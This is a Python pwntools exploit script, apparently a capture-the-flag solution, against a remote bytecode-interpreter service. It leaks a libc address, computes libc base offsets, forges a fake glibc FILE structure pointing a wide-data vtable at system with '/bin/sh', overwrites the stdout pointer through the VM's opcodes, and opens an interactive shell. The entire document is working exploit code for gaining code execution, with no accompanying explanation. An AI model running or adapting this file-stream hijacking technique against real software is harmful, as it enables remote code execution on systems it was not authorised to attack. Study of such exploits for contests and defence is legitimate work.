from pwn import * 

from enum import Enum

libc = ELF("./libc.so.6")

ADD = 0
SUB = 1
DIV = 2
MUL = 3
AND = 4      # and two values and stores the result in $rax
XOR = 5      # xors 2 values and stores the result in $rax
OR = 6       # or 2 values and stores the result in $rax
PUSH = 7     # pushes the value to the stack
POP = 8      # pops the first value on the stack to $rax
PRT = 9      # convert the arg to string and prints it
PUTS = 10    # dereferences an address then prints from it
DEC = 11     # decrements rax by x
INC = 12     # increments rax by x
LEA = 13
NOP = 14     # no operation
HALT = 15


code = p8(PUTS) + p32(0x404020)

#r = process("./bytecode")
r = remote("172.210.129.230", 1350)

r.sendlineafter(">> ", code)
leak = u64(r.recvline().strip() + p16(0))
log.info("Libc leak 0x%x", leak)
libc.address = leak - 0x2045c0
log.info("Libc base 0x%x", libc.address)

stdout = libc.symbols['_IO_2_1_stdout_']
stdout_lock = libc.address + 0x205710
system = libc.symbols['system']

log.info("system 0x%x", system)
log.info("stdout 0x%x", stdout)

pause()
# overwrite stdout
#gdb.attach(r, 'b *0x7ffff7dfc437')

def pack_file(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0,
              _wide_data = 0,
              _mode = 0):
    #file_struct = p32(_flags) + \
    #         p32(0) + \
    file_struct = p64(_flags) + \
             p64(_IO_read_ptr) + \
             p64(_IO_read_end) + \
             p64(_IO_read_base) + \
             p64(_IO_write_base) + \
             p64(_IO_write_ptr) + \
             p64(_IO_write_end) + \
             p64(_IO_buf_base) + \
             p64(_IO_buf_end) + \
             p64(_IO_save_base) + \
             p64(_IO_backup_base) + \
             p64(_IO_save_end) + \
             p64(_IO_marker) + \
             p64(_IO_chain) + \
             p32(_fileno)
    file_struct = file_struct.ljust(0x88, b"\x00")
    file_struct += p64(_lock)
    file_struct = file_struct.ljust(0xa0, b"\x00")
    file_struct += p64(_wide_data)
    file_struct = file_struct.ljust(0xc0, b'\x00')
    file_struct += p64(_mode)
    file_struct = file_struct.ljust(0xd8, b"\x00")
    return file_struct

fake_stdout = 0x404060
wide_data_ptr = fake_stdout+0x10
fake_vtable_ptr = fake_stdout+0xe0-0x68
fake_vtable = libc.sym._IO_wfile_jumps # part of _IO_wfile_jumps_maybe_mmap so that we can invoke _IO_wfile_overflow
fake_file_struct = pack_file(_flags=0x3b01010101010101, _IO_read_ptr=u64(b'/bin/sh\x00'), _wide_data=wide_data_ptr, _lock=stdout_lock) + p64(fake_vtable) + p64(system) + p64(0) + p64(fake_vtable_ptr)

def write_at(addr, what):
    code  = p8(LEA) + p64(addr) + what
    return code

data = b""
i = 0
j = len(fake_file_struct)
while i < len(fake_file_struct):
    data += p8(PUSH) + fake_file_struct[j-8:j]
    i+=8
    j-=8

r.sendlineafter(">> ", data)

r.sendlineafter(">> ", write_at(0x404020, p64(fake_stdout)))

r.interactive()
